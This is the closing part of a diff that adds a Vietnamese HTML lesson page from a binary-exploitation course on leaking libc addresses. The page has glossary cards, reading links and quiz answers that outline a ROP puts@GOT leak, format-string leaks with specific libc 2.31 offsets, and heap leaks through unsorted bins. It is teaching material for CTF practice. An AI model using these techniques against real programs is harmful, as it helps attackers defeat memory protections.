+    <div class="card"><div class="term">GOT</div><p>Bảng địa chỉ thật của hàm.</p></div>
+    <div class="card"><div class="term">__environ</div><p>Con trỏ stack trong libc.</p></div>
+    <div class="card"><div class="term">rebase</div><p>base = leak − offset.</p></div>
+    <div class="card"><div class="term">libc-database</div><p>Nhận libc từ leak.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Dùng để: <a href="ret2libc.html">ret2libc</a> · <a href="fmtstr.html">fmtstr</a> · <a href="unsorted_largebin.html">unsorted leak</a>. Nền: PLT/GOT (xem <a href="ret2dlresolve.html">ret2dlresolve §01</a>).</li>
+    <li>libc-database (niklasb) · pwntools ELF/libc docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 6.</strong> Leak 1 địa chỉ → base = leak − offset. Libc: puts(GOT)/fmt(%21$p=−0x24083)/unsorted(−0x1ecbe0). Stack: __environ. Tiếp theo: canary.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("lk-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("lk-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var answers=[
+    "→ <b>GOT leak</b>: ROP pop_rdi; puts@got; puts@plt; main. libc.base = leak − libc.sym.puts (2.31: −0x875a0). Nếu địa chỉ có null → write(1,got,8).",
+    "→ <b>Format string</b>: %N$p dò ô chứa libc (vd %21$p = __libc_start_main+243 → base − 0x24083). Hoặc %N$s đọc địa chỉ tùy ý. Xem bài fmtstr.",
+    "→ <b>Heap leak</b>: free chunk lớn → unsorted → UAF read fd = libc+0x1ecbe0 (leak libc). Free chunk nhỏ → tcache fd = heap (leak heap, nhớ safe-link ≥2.32).",
+    "→ <b>Leak bất kỳ</b>: đọc GOT → libc; đọc *__environ (sau khi có libc) → stack; đọc canary slot. Arbitrary-read là mạnh nhất — leak được mọi vùng."
+  ];
+  var opts=document.getElementById("opts"),ans=document.getElementById("ans");
+  opts.addEventListener("click",function(e){
+    var a=e.target.getAttribute("data-a"); if(a===null)return;
+    ans.innerHTML=answers[+a]; ans.classList.add("show");
+  });
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
